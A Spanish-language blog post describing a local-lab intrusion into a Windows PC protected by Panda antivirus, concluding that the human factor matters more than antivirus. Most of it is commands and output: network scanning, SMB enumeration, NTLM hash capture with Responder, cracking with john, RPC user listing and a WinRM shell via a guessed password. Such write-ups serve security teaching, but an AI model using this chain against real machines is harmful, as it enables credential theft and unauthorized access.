---
title: Vulnerando un equipo protegido con antivirus
author: HackerCloud
date: 2022-09-2 00:00:00 +0800
categories: [Blogging, Security]
tags: [Blogging]
image:
  path: ../../assets/img/commons/panda-security/panda.png
  width: 800
  height: 500
  alt: Banner Panda Security
---

Antes de empezar deciros que esto es un entorno de pruebas en local, panda security es un antivirus muy bueno para las personas que no saben de ciberseguridad y quieren estar protegidos, en este artículo lo que más importa es el último párrafo.

Para empezar tenemos que enumerar los equipos que están en nuestro segmento de red, para eso usaremos el parámetro `-sP` de nmap

```ruby
❯ sudo nmap -sP 192.168.1.44/24
Nmap scan report for 192.168.1.16
MAC Address: REDACTED (REDACTED)
Nmap scan report for REDACTED (192.168.1.20)
Host is up.
Nmap done: 256 IP addresses (X hosts up) scanned in 2.08 seconds
```

Con esto ya podemos empezar el escaneo de puertos con nmap

```ruby
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49667/tcp open  msrpc         Microsoft Windows RPC
5985/tcp  open  wsman         
```

Está el puerto SMB abierto así que podemos empezar a enumerarlo con crackmapexec

```ruby
❯ crackmapexec smb 192.168.1.20
SMB         192.168.1.20    445    REDACTED         [*] Windows 10.0 Build x64 (name:REDACTED) (domain:REDACTED) (signing:False) (SMBv1:False)
```

Vemos que tiene la firma desactivada, podemos empezar con un simple SMB Relay, este ataque consiste en ejecutar el [responder](https://github.com/SpiderLabs/Responder) y esperar a que alguien acceda o intente acceder a un recurso compartido a nivel de red sin importar que dicho recurso exista, esta vulnerabilidad es muy común en empresas ya que solo es necesario tener la firma deshabilitada para ser vulnerable

Este ataque lo estoy haciendo con Panda Security Professional activado y con el firewall activado, en este ataque solo importa que la firma esté desactivada

Solamente tenemos que ejecutar el responder con el parámetro -I para indicar nuestra interfaz de red

```ruby
❯ python3 Responder.py -I wlan0
[+] Poisoners:                                                                                                                                                
    LLMNR                      [ON]                                                                                                                           
    NBT-NS                     [ON]                                                                                                                           
    MDNS                       [ON]                                                                                                                           
    DNS                        [ON]                                                                                                                           
    DHCP                       [OFF]
[+] Servers:                                                                                                                                                  
    HTTP server                [ON]                                                                                                                           
    HTTPS server               [ON]                                                                                                                           
    WPAD proxy                 [OFF]                                                                                                                          
    Auth proxy                 [OFF]                                                                                                                          
    SMB server                 [ON]                                                                                                                           
    Kerberos server            [ON]                                                                                                                           
    SQL server                 [ON]                                                                                                                           
    FTP server                 [ON]                                                                                                                           
    IMAP server                [ON]                                                                                                                           
    POP3 server                [ON]                                                                                                                           
    SMTP server                [ON]                                                                                                                           
    DNS server                 [ON]                                                                                                                           
    LDAP server                [ON]                                                                                                                           
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]
REDACTED
[SMB] NTLMv1-SSP Client   : REDACTED
[SMB] NTLMv1-SSP Username : WORKGROUP\user
[SMB] NTLMv1-SSP Hash     : user::WORKGROUP:REDACTED:REDACTED:REDACTED
```

Con este hash ya solamente queda intentar crackearlo, en este caso he usado john con el diccionario rockyou.txt, como la contraseña era débil he podido crackearla

```ruby
❯ john --show hash
user:REDACTED

1 password hash cracked, 0 left
```

Como esto ha sido demasiado fácil, vamos a hacer como que el SMB está firmado en todos los equipos

Podemos empezar probando con smbclient para ver si tiene habilitado el null session

```ruby
❯ smbclient -L 192.168.1.20 -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.1.20 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Nos dice que está habilitado el null session pero no hay ninguna carpeta compartida, podemos hacer lo mismo con smbmap o crackmapexec para asegurarnos

```ruby
❯ smbmap -H 192.168.1.20 -u ""
[+] IP: 192.168.1.20:445        Name: REDACTED
```

```ruby
❯ crackmapexec smb 192.168.1.20 -u "" -p "" --shares 
SMB         192.168.1.20    445    REDACTED         [-] Error enumerating shares: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied}
```

No vemos nada con ninguna de las 3 herramientas, podemos seguir por el puerto RPC para intentar enumerar usuarios del dominio

```bash
❯ rpcclient -U "" 192.168.1.20 -N -c "enumdomusers" | grep -oP '\[.*?\]' | sort -u | tr -d '[]'
```

Nos da dos usuarios, el usuario Administrador y el usuario user, podemos probar a conectarnos por winrm usando de contraseña el usuario ya que el puerto winrm está abierto

```powershell
❯ evil-winrm -i 192.168.1.20 -u 'user' -p 'user'

Evil-WinRM shell v3.4

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

PS C:\Users\user\Documents>
```

Y con esto nos podemos dar cuenta de que por muchas protecciones de antivirus que te pongas, sigue siendo más importante el factor humano.
